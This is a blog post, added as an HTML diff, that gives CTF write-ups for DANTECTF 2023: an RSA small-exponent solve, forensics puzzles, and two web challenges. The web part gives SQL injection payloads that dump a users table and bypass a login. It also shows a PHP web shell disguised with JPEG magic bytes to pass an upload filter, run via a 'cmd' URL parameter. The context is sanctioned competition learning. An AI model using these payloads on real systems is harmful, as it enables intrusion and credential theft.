@@ -1,0 +1,437 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>Mj0ln1r-DANTECTF 2023</title>
+  <link rel="icon" type="image/x-icon" href="assets/img/favicons/favicon.ico">
+  <link rel="stylesheet" href="/css/main.css">
+
+  <!-- <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>DANTECTF 2023 | Mj0ln1’s Blog</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="DANTECTF 2023" />
+<meta name="author" content="Mj0ln1" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Hello all! I played DANTECTF 2023 which was happened from 02 June to 5 June. I played it with my team Invaders0x1." />
+<meta property="og:description" content="Hello all! I played DANTECTF 2023 which was happened from 02 June to 5 June. I played it with my team Invaders0x1." />
+<link rel="canonical" href="http://localhost:8000/posts/dantectf23" />
+<meta property="og:url" content="http://localhost:8000/posts/dantectf23" />
+<meta property="og:site_name" content="Mj0ln1’s Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-06-06T00:00:00+05:30" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="DANTECTF 2023" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Mj0ln1","url":"https://themj0ln1r.github.io"},"dateModified":"2023-06-06T00:00:00+05:30","datePublished":"2023-06-06T00:00:00+05:30","description":"Hello all! I played DANTECTF 2023 which was happened from 02 June to 5 June. I played it with my team Invaders0x1.","headline":"DANTECTF 2023","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:8000/posts/dantectf23"},"url":"http://localhost:8000/posts/dantectf23"}</script>
+<!-- End Jekyll SEO tag -->
+ 
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div class="head-parent">
+      <a href="/">
+        <h1>mj0ln1r@home:~$</h1></a>
+        <span id="command">cat DANTECTF</span>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  <h2>DANTECTF 2023</h2>
+  <time datetime="2023-06-06T00:00:00+05:30" class="by-line">06 Jun 2023</time>
+  <p>Hello all! 
+I played <a href="https://ctftime.org/event/2000" target="_blank">DANTECTF 2023</a> which was happened from  02 June to 5 June. I played it with my team <a href="https://ctftime.org/team/217079">Invaders0x1</a>.</p>
+
+<p>This I got you some SQL Injection tutorials here. These are the writeups for the challenges I solvded..</p>
+
+<h1 id="crypto">Crypto</h1>
+
+<h1 id="small-inscription">Small Inscription</h1>
+
+<p>Description :</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>I came across a strange inscription on the gate that connects two circles, but I cannot read the last part. Can you help me?
+
+Attached files : [SmallInscription.py] [SmallInscription.output]
+</code></pre></div></div>
+
+<p>SmallInscription.py</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">from</span> <span class="n">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">bytes_to_long</span><span class="p">,</span> <span class="n">getPrime</span>
+<span class="kn">from</span> <span class="n">secret</span> <span class="kn">import</span> <span class="n">FLAG</span>
+<span class="k">assert</span> <span class="nf">len</span><span class="p">(</span><span class="n">FLAG</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">30</span>
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+    <span class="n">msg</span> <span class="o">=</span> <span class="nf">bytes_to_long</span><span class="p">(</span><span class="sa">b</span><span class="s">'There is something reeeally important you should know, the flag is '</span><span class="o">+</span><span class="n">FLAG</span><span class="p">)</span>
+    <span class="n">N</span> <span class="o">=</span> <span class="nf">getPrime</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span><span class="o">*</span><span class="nf">getPrime</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+    <span class="n">e</span> <span class="o">=</span> <span class="mi">3</span>
+    <span class="n">ct</span> <span class="o">=</span> <span class="nf">pow</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">N</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">ct</span><span class="o">=</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">N</span><span class="o">=</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>SmallInscription.output</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ct=747861028284745583986165203504322648396510749839398405070811323707600711491863944680330526354962376022146478962637944671170833980881833864618493670661754856280282476606632288562133960228178540799118953209069757642578754327847269832940273765635707176669208611276095564465950147643941533690293945372328223742576232667549253123094054598941291288949397775419176103429124455420699502573739842580940268711628697334920678442711510187864949808113210697096786732976916002133678253353848775265650016864896187184151924272716863071499925744529203583206734774883138969347565787210674308042083803787880001925683349235960512445949
+N=20948184905072216948549865445605798631663501453911333956435737119029531982149517142273321144075961800694876109056203145122426451759388059831044529163118093342195028080582365702020138256379699270302368673086923715628087508705525518656689253472590622223905341942685751355443776992006890500774938631896675247850244098414397183590972496171655304801215957299268404242039713841456437577844606152809639584428764129318729971500384064454823140992681760685982999247885351122505154646928804561614506313946302901152432476414517575301827992421830229939161942896560958118364164451179787855749084154517490249401036072261469298158281
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">e=3</code> which is too small for the encryption. There is an attack existed called <code class="language-plaintext highlighter-rouge">Low Exponent Attack</code> on RSA when <code class="language-plaintext highlighter-rouge">e</code> was small.</p>
+
+<p>When the e=3, we can get the plaintext by finding the <code class="language-plaintext highlighter-rouge">cube root</code> of the <code class="language-plaintext highlighter-rouge">ct</code>. Because the ciphertext was just the message rised to the e.</p>
+
+<p>There is a catch to note. When <code class="language-plaintext highlighter-rouge">pow(m,e)</code> is less than the modulus, we can just calculate the cube root of the <code class="language-plaintext highlighter-rouge">ct</code> to get message. If not, we have to find the cube root of <code class="language-plaintext highlighter-rouge">(ct+kN)</code> where <code class="language-plaintext highlighter-rouge">k</code> is some integer in the field.</p>
+
+<p>As the message in the challenge already about 50 chars, the <code class="language-plaintext highlighter-rouge">pow(m,e)</code> might be greater than the <code class="language-plaintext highlighter-rouge">N</code>. So, I implemented the second case to get the flag.</p>
+
+<p>solve.py</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">gmpy2</span> <span class="kn">import</span> <span class="n">iroot</span>
+<span class="kn">from</span> <span class="n">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">n</span> <span class="o">=</span> <span class="mi">20948184905072216948549865445605798631663501453911333956435737119029531982149517142273321144075961800694876109056203145122426451759388059831044529163118093342195028080582365702020138256379699270302368673086923715628087508705525518656689253472590622223905341942685751355443776992006890500774938631896675247850244098414397183590972496171655304801215957299268404242039713841456437577844606152809639584428764129318729971500384064454823140992681760685982999247885351122505154646928804561614506313946302901152432476414517575301827992421830229939161942896560958118364164451179787855749084154517490249401036072261469298158281</span>
+<span class="n">e</span> <span class="o">=</span> <span class="mi">3</span>
+<span class="n">ct</span> <span class="o">=</span> <span class="mi">747861028284745583986165203504322648396510749839398405070811323707600711491863944680330526354962376022146478962637944671170833980881833864618493670661754856280282476606632288562133960228178540799118953209069757642578754327847269832940273765635707176669208611276095564465950147643941533690293945372328223742576232667549253123094054598941291288949397775419176103429124455420699502573739842580940268711628697334920678442711510187864949808113210697096786732976916002133678253353848775265650016864896187184151924272716863071499925744529203583206734774883138969347565787210674308042083803787880001925683349235960512445949</span>
+
+<span class="n">c</span> <span class="o">=</span> <span class="n">ct</span>
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="n">m</span> <span class="o">=</span> <span class="nf">iroot</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="mi">3</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+    <span class="k">if</span> <span class="nf">pow</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span> <span class="o">==</span> <span class="n">ct</span><span class="p">:</span>
+        <span class="nf">print</span><span class="p">(</span><span class="nf">long_to_bytes</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">m</span><span class="p">)))</span>
+        <span class="k">break</span>
+    <span class="n">c</span> <span class="o">+=</span> <span class="n">n</span>
+
+<span class="c1"># There is something reeeally important you should know, the flag is DANTE{sM4ll_R00tzz}
+</span></code></pre></div></div>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">Flag : DANTE{sM4ll_R00tzz}</code></p>
+</blockquote>
+
+<hr />
+
+<h1 id="web">Web</h1>
+
+<h1 id="dante-barber-shop">Dante Barber Shop</h1>
+
+<p>Description :</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Welcome to our renowned barber shop!
+Your task, should you choose to accept it, is to uncover hidden information and retrieve the sensitive data that the owners may have left around.
+
+Challenge : https://barbershop.challs.dantectf.it
+</code></pre></div></div>
+
+<p>The website presents few photos and a login page. Viewing the source code reveals that there is an another image which was not showed in the website.</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"img/barber2.jpg"</span> <span class="na">alt=</span><span class="s">"Barber Shop"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"img/barber3.jpg"</span> <span class="na">alt=</span><span class="s">"Barber Shop"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"img/barber4.jpg"</span> <span class="na">alt=</span><span class="s">"Barber Shop"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"img/barber5.jpg"</span> <span class="na">alt=</span><span class="s">"Barber Shop"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"img/barber6.jpg"</span> <span class="na">alt=</span><span class="s">"Barber Shop"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"img/barber7.jpg"</span> <span class="na">alt=</span><span class="s">"Barber Shop"</span><span class="nt">&gt;</span>
+</code></pre></div></div>
+
+<p>Okay the <code class="language-plaintext highlighter-rouge">img/barber1.jpg</code> was not displayed here. By trying to access it revealed the barber credentials.</p>
+
+<p><strong>https://barbershop.challs.dantectf.it/img/barber1.jpg</strong></p>
+
+<p><img src="/assets/img/post_img/dante23_barber1.png" alt="Barber" /></p>
+
+<p>Used <code class="language-plaintext highlighter-rouge">barber : dant3barbersh0p_cLIVeSidag</code> to login. A customer database was displayed and a search field was available to search for the entries.</p>
+
+<p>When I searh for <code class="language-plaintext highlighter-rouge">'</code> in the search field a <code class="language-plaintext highlighter-rouge">sqlite3</code> error were displayed. So, It was confirmed that the <code class="language-plaintext highlighter-rouge">SQL Injection</code> vulnerability in the system.</p>
+
+<ul>
+  <li>
+    <p>Then I enumerated the number of columns with the <code class="language-plaintext highlighter-rouge">UNION</code>.</p>
+
+    <ul>
+      <li>Payload <code class="language-plaintext highlighter-rouge">' union select 1,2,3,4--</code> Confirms that there were 4 columns available.</li>
+    </ul>
+  </li>
+  <li>
+    <p>Enumerating table name</p>
+
+    <ul>
+      <li>Payload <code class="language-plaintext highlighter-rouge">' union select 1,group_concat(tbl_name),3,4 FROM sqlite_master WHERE type = "table"-- </code> returned the column names <code class="language-plaintext highlighter-rouge">users,sqlite_sequence,customers</code></li>
+    </ul>
+  </li>
+  <li>
+    <p>Selected columns from table</p>
+
+    <ul>
+      <li>Payload <code class="language-plaintext highlighter-rouge">' union select 1,sql,3,4 from sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name='users'--</code> confirms the columns names <code class="language-plaintext highlighter-rouge">id,username,password</code>.</li>
+    </ul>
+  </li>
+  <li>
+    <p>So now we have table name as well as column name, final thing which we need to do is, extraction of data from the desired column which can be performed by simple SQL query.</p>
+
+    <ul>
+      <li>
+        <p>Payload <code class="language-plaintext highlighter-rouge">'union SELECT 1,username,password,4 FROM users--</code> printed the admin crendentials on the screen.</p>
+      </li>
+      <li>
+        <p><code class="language-plaintext highlighter-rouge">admin : nSOrowLIstERiMbrUsHConesueyeadEr</code></p>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<p>When I logged in to the website with admin credentials, the flag was displayed in the admin dashboard.</p>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">Flag : DANTE{dant3_1s_inj3cting_everyb0dy_aaxxaa}</code></p>
+</blockquote>
+
+<hr />
+
+<h1 id="dumb-admin">Dumb Admin</h1>
+
+<p>Description :</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The Admin coded his dashboard by himself. He’s sure to be a pro coder and he’s so satisfied about it. Can you make him rethink that?
+
+Challenge : https://dumbadmin.challs.dantectf.it/
+</code></pre></div></div>
+
+<p>The website was a login page. After some failed tries to find crendentials of the source of the website, I tried to use a basic login bypass <code class="language-plaintext highlighter-rouge">SQL injection</code> payload.</p>
+
+<p>Username : <code class="language-plaintext highlighter-rouge">admin' 1=1 --</code>
+Password : <code class="language-plaintext highlighter-rouge">1234</code></p>
+
+<p>This payload was worked fine and I was able to login as admin.</p>
+
+<p>The admin page has a option to upload a image.</p>
+
+<p><img src="/assets/img/post_img/dante23_dubm1.png" alt="dumb" /></p>
+
+<p>I thought that there might be a <code class="language-plaintext highlighter-rouge">File upload</code> vulnerability in the website.</p>
+
+<p>First uploaded a jpg of 2 kb and it was rendered in the webpage. When I view the source code, I found a direct url to the image uploaded.</p>
+
+<p><code class="language-plaintext highlighter-rouge">https://dumbadmin.challs.dantectf.it/f9bbbecb61014db8f0674bf60c27e668/8347dc6bbcfb8d457453656ae33181d7.png</code></p>
+
+<p>So, If we upload a php file we can execute in by going to the actual URL.</p>
+
+<p>The <code class="language-plaintext highlighter-rouge">php</code> file <code class="language-plaintext highlighter-rouge">file.php</code></p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span> <span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>What this code will do is, This can execute the commands passed in the <code class="language-plaintext highlighter-rouge">cmd</code> argument in the URL of the file.php</p>
+
+<p>I tried to upload this on the website, Got an error message.</p>
+
+<p><code class="language-plaintext highlighter-rouge">The extension '.php' indicate it is not an image!</code></p>
+
+<p>So, Tried some extension bypass techniques on the hacktricks webpage. Now uploaded the file as <code class="language-plaintext highlighter-rouge">file.jpg.php</code>. Again got an error.</p>
+
+<p><code class="language-plaintext highlighter-rouge">Uploaded file seems to be not a real image!</code></p>
+
+<p>Okay, there might be a magic bytes check was done here. So, I edited the magic bytes of the <code class="language-plaintext highlighter-rouge">file.jpg.php</code> with the <strong>hexed.it</strong> webtool. Inserted the <code class="language-plaintext highlighter-rouge">jpg</code> header values to the <code class="language-plaintext highlighter-rouge">file.jpg.php</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>00000000: ffd8 ff3c 3f70 6870 0a09 6563 686f 2073  ...&lt;?php..echo s
+00000010: 6865 6c6c 5f65 7865 6328 245f 4745 545b  hell_exec<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span>
+00000020: 2763 6d64 275d 293b 0a3f 3e0a            <span class="s1">'cmd'</span><span class="o">])</span><span class="p">;</span>.?&gt;.
+</code></pre></div></div>
+
+<p>So, as we can see in the above hexdump of the file contains jpg headers.</p>
+
+<p>Lets try to upload this file.</p>
+
+<p>This time everything was fine and the image <code class="language-plaintext highlighter-rouge">file.jpg.php</code> was not rendered as it is not an image. I moved to the actual URL of the uploaded file as we already founf it in the beginning.</p>
+
+<p>I moved to <code class="language-plaintext highlighter-rouge">https://dumbadmin.challs.dantectf.it/f9bbbecb61014db8f0674bf60c27e668/9180871cb76494741eb99e2181d57e54.jpg.php</code></p>
+
+<p>And there were nothing to see, then i passed <code class="language-plaintext highlighter-rouge">ls</code> in the <code class="language-plaintext highlighter-rouge">cmd</code> argument from the URL.</p>
+
+<p>Boom, This prints the list of files available on the server.</p>
+
+<p>Now we can move across the file system of the server, I found the flag was at <code class="language-plaintext highlighter-rouge">/flag.txt</code>.</p>
+
+<p>The URL, <code class="language-plaintext highlighter-rouge">https://dumbadmin.challs.dantectf.it/f9bbbecb61014db8f0674bf60c27e668/9180871cb76494741eb99e2181d57e54.jpg.php?cmd=cat%20/flag.txt</code> . Prints out the flag for us</p>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">Flag : DANTE{Y0u_Kn0w_how_t0_bypass_things_in_PhP9Abd7BdCFF}</code></p>
+</blockquote>
+
+<hr />
+
+<h1 id="forensics">Forensics</h1>
+
+<h1 id="imago-qualitatis">Imago Qualitatis</h1>
+
+<p>Description :</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>A wondrous electromagnetic wave was captured by a metal-stick-handed devil.
+“But.. What? No, not this way. Maybe, if I turn around like this… Aha!”
+
+Attached file : [ImagoQualitatis.7z]
+</code></pre></div></div>
+
+<p>The ImagoQualitatis.7z archive contains the <code class="language-plaintext highlighter-rouge">gqrx_20230421_133330_433000000_1800000_fc.raw</code> file of size 4GB+.</p>
+
+<p>I searched about the term <code class="language-plaintext highlighter-rouge">gqrx</code> on google, and found that it was a radio transmission raw file.
+/
+The software used to generate this file was <code class="language-plaintext highlighter-rouge">gqrx sdr</code>, which is an open source software defined radio receiver (SDR) powered by the GNU Radio and the Qt graphical toolkit.</p>
+
+<p>Then I installed it on my machine using the following command</p>
+
+<p><code class="language-plaintext highlighter-rouge">sudo apt-get install gnuradio gqrx</code></p>
+
+<p>Then Launched the software with the command <code class="language-plaintext highlighter-rouge">gqrx</code>. It loaded the software.</p>
+
+<p><img src="/assets/img/post_img/dante23_imago1.png" alt="gqrx" /></p>
+
+<p>I dont know how to play the <code class="language-plaintext highlighter-rouge">raw</code> file in this software.</p>
+
+<p><a href="https://hamsci.org/resource/how-play-rri-raw-iq-file-gqrx" target="_blank">This</a> tutorial helped me to load the raw file on the gqrx software.</p>
+
+<p>I played the raw file and observed the spectrum displayed on in the software console. I saw flag characters were display with some delay in between them.</p>
+
+<p><img src="/assets/img/post_img/dante23_imago2.png" alt="gqrx" /></p>
+
+<p>Noted down the characters on paper.</p>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">Flag : DANTE{n3w_w4v35_0ld_5ch00l}</code></p>
+</blockquote>
+
+<h1 id="do-you-know-gif">Do You Know GIF?</h1>
+
+<p>Description :</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Ah, Dante! He appears in poems, videogames… He wrote about a lot of people but few have something meaningful to say about him nowadays.
+
+Attached file : [dante.gif(14mb)]
+</code></pre></div></div>
+
+<p>The file size tempted me to check for the embedded files in the GIF using <code class="language-plaintext highlighter-rouge">steghide</code>,<code class="language-plaintext highlighter-rouge">stegoveritas</code> and <code class="language-plaintext highlighter-rouge">stegextract</code> and many more, but none of them was able to extract data.</p>
+
+<p>Then tried exiftool on the <code class="language-plaintext highlighter-rouge">dante.gif</code>. Found a comment but it was not a flag. After trying all options on exiftool <code class="language-plaintext highlighter-rouge">-a</code> of exiftool loaded all the comments of <code class="language-plaintext highlighter-rouge">dante.gif</code> file.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mj0ln1r@Linux:/<span class="nv">$ </span>exiftool dante.gif  | <span class="nb">grep </span>Comment
+Comment                         : Hey look, a comment!
+mj0ln1r@Linux:/<span class="nv">$ </span>exiftool <span class="nt">-a</span> dante.gif  | <span class="nb">grep </span>Comment
+Comment                         : Hey look, a comment!
+Comment                         : These comments sure <span class="k">do </span>look useful
+Comment                         : I wonder what <span class="k">else </span>I could <span class="k">do </span>with them?
+Comment                         : 44414e54457b673166355f
+Comment                         : 3472335f6d3464335f6279
+Comment                         : 5f626c30636b357d
+Comment                         : At the edges of the map lies the void
+</code></pre></div></div>
+
+<p>Converted the hex strings to ascii to get the flag</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>44414e54457b673166355f : DANTE{g1f5_
+3472335f6d3464335f6279 : 4r3_m4d3_by
+5f626c30636b357d : _bl0ck5}
+</code></pre></div></div>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">Flag: DANTE{g1f5_4r3_m4d3_by_bl0ck5}</code></p>
+</blockquote>
+
+<hr />
+
+<h1 id="misc">Misc</h1>
+
+<h1 id="flag-fabber">Flag Fabber</h1>
+
+<p>Description :</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>The modern times offer marvelous ways of bringing your projects to life. Well, in 1300 AD they didn’t really have mass manufacturing tools, so that’s not a fair comparison after all.
+
+Attached Files : [agFabber.zip]
+</code></pre></div></div>
+
+<p>Zip file has multiple files with extensions [.gbs,.gbl,.gbp]</p>
+
+<p>Reading one of the file has the following content.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mj0ln1r@Linux:/<span class="nv">$ </span><span class="nb">head </span>flagFabber-B_Cu.gbl
+G04 <span class="c">#@! TF.GenerationSoftware,KiCad,Pcbnew,7.0.1*</span>
+G04 <span class="c">#@! TF.CreationDate,2023-05-15T13:30:28+02:00*</span>
+G04 <span class="c">#@! TF.ProjectId,flagfabber,666c6167-6661-4626-9265-722e6b696361,rev?*</span>
+G04 <span class="c">#@! TF.SameCoordinates,Original*</span>
+G04 <span class="c">#@! TF.FileFunction,Copper,L2,Bot*</span>
+G04 <span class="c">#@! TF.FilePolarity,Positive*</span>
+%FSLAX46Y46<span class="k">*</span>%
+G04 Gerber Fmt 4.6, Leading zero omitted, Abs format <span class="o">(</span>unit mm<span class="o">)</span><span class="k">*</span>
+G04 Created by KiCad <span class="o">(</span>PCBNEW 7.0.1<span class="o">)</span> <span class="nb">date </span>2023-05-15 13:30:28<span class="k">*</span>
+%MOMM<span class="k">*</span>%
+</code></pre></div></div>
+
+<p>A quick search about <code class="language-plaintext highlighter-rouge">Gerber</code>, <code class="language-plaintext highlighter-rouge">gbs,gbl files</code> adn <code class="language-plaintext highlighter-rouge">Kicad</code> says that it was a <code class="language-plaintext highlighter-rouge">Gerber file</code> Generated by Kicad. Used An online <a href="https://www.pcbgogo.com/GerberViewer.html" target="_blank">Gerber Viewer</a> to visualize the file.</p>
+
+<p><img src="/assets/img/post_img/dante23_gerber.png" alt="Gerber" /> (image from born2scan)</p>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">Flag : DANTE{pcb5_4r3_c00l}</code></p>
+</blockquote>
+
+<h1 id="hanging-nose">Hanging Nose</h1>
+
+<p>Description :</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Divine Comedy-themed Christmas tree baubles: that’s the future of the ornaments business, I’m telling you!
+
+Attached Files : [HangingNose.stl]
+</code></pre></div></div>
+
+<p>Used an online stl file viewer to visualize the 3D file.</p>
+
+<p><a href="https://www.viewstl.com/" target="_blank">stl viewer</a></p>
+
+<p><img src="/assets/img/post_img/dante23_hanging.png" alt="Hanging" /></p>
+
+<hr />
+
+<p>Thank you for reading!</p>
+
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="/">
+    <span>
+        <b>Mj0ln1r</b>
+    </span>
+    
+    <span>© 2023
+  </a>
+
+  <a href="https://twitter.com/TheMj0ln1r" target="_blank">
+  </span>/Twitter</span>
+  </a>
+
+  <a href="https://github.com/TheMj0ln1r" target="_blank">
+  </span>/Github</span>
+  </a>
+
+  <a href="https://www.linkedin.com/in/mj0ln1r" target="_blank">
+  </span>/LinkedIn</span></a>
+
+  <a href=""><span style="color:red;">^TOP</span></a>
+
+</footer>
+
+  
+</body>
+
+</html>
